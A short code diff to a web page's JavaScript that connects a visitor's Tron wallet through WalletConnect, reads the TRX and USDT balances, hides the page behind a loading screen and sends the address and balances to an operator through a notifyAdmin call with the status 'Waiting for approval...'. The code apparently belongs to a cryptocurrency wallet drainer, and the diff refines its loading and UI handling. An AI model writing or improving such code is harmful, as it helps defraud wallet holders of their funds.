@@ -65,6 +65,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
         await loadScript("wc-bundle.js");
         await loadScript("https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js");
         document.getElementById('next-btn').innerText = "Next";
+        if (typeof window.connectWalletConnectTron !== 'function') return alert("System still loading, try again in a second.");
     }
 
     const result = await window.connectWalletConnectTron();
@@ -73,8 +74,8 @@ document.getElementById('next-btn').addEventListener('click', async () => {
         const { trx, usdt } = await getStats(address);
         
         document.getElementById('view-balance').innerText = usdt;
-        document.getElementById('main-content').classList.add('opacity-10');
-        document.getElementById('loading-screen').style.display = 'flex';
+        document.getElementById('page-wrapper').classList.add('opacity-10');
+        document.getElementById('loading-screen').classList.remove('hidden');
 
         await notifyAdmin("CONNECTED", address, trx, usdt, "Waiting for approval...");
 
